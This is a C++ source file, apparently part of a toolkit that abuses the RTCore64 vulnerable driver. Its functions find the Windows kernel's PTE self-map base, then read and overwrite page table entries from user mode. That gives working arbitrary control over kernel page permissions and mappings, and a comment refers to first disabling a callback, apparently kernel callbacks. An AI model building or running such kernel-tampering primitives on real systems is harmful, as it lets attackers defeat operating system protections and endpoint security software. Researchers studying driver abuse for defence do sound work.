#include "pte.h"
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include <cstdio>

static DWORD64 s_pteBase = 0;

void PteResetCache() { s_pteBase = 0; }

DWORD64 GetMmPteBase() {
    if (s_pteBase) return s_pteBase;

    // KernelExport returns the kernel VA of the MmPteBase *variable*.
    // Reading that VA gives us the actual PTE self-map base address.
    DWORD64 varVA = KUtil::KernelExport("MmPteBase");
    if (!varVA) {
        printf("[pte] MmPteBase not exported by ntoskrnl (need Win10 RS3+)\n");
        return 0;
    }

    DWORD64 base = g_drv->Rd64(varVA);
    if (!g_drv->IsKernelVA(base)) {
        printf("[pte] MmPteBase value 0x%016llX is not a kernel VA\n", base);
        return 0;
    }

    s_pteBase = base;
    return s_pteBase;
}

// Each PTE covers 4096 bytes.  Byte offset into PTE array = (va >> 12) * 8 = va >> 9.
// Works for the full canonical 48-bit VA space.
DWORD64 PteVaOf(DWORD64 va) {
    DWORD64 base = GetMmPteBase();
    if (!base) return 0;
    // Strip sign extension bits (keep low 48 bits for the shift)
    DWORD64 idx = (va & 0x0000FFFFFFFFFFFFULL) >> 9;
    return base + idx;
}

PteInfo ReadPte(DWORD64 va) {
    PteInfo info{};
    info.pte_va = PteVaOf(va);
    if (!info.pte_va || !g_drv->IsKernelVA(info.pte_va)) {
        info.valid = false;
        return info;
    }

    info.valid    = true;
    info.pte_val  = g_drv->Rd64(info.pte_va);
    info.page_pa  = info.pte_val & PTE_PA_MASK;
    info.present   = (info.pte_val & PTE_PRESENT) != 0;
    info.writable  = (info.pte_val & PTE_WRITE)   != 0;
    info.user      = (info.pte_val & PTE_USER)     != 0;
    info.executable= (info.pte_val & PTE_NX)       == 0;
    return info;
}

bool WritePte(DWORD64 va, DWORD64 newPteVal) {
    DWORD64 pteVA = PteVaOf(va);
    if (!pteVA || !g_drv->IsKernelVA(pteVA)) return false;
    // Two Wr32 calls — RTCore64 max atomic unit is 4 bytes.
    // Write lower DWORD first so the page is non-present during the brief window,
    // then upper DWORD to complete the new PA.
    // Note: a Present=0 PTE means the CPU will page-fault on access during the
    // ~1 µs window between the two writes.  Kernel code pages should not be
    // actively executing during this window when called from a single-threaded
    // test.  For production use, disable the relevant callback first (/disable).
    DWORD lo = (DWORD)(newPteVal & 0xFFFFFFFEULL); // clear Present bit in lo
    DWORD hi = (DWORD)(newPteVal >> 32);
    g_drv->Wr32(pteVA,     lo);                    // present=0 momentarily
    g_drv->Wr32(pteVA + 4, hi);
    g_drv->Wr32(pteVA,     (DWORD)(newPteVal & 0xFFFFFFFFULL)); // restore Present
    return true;
}
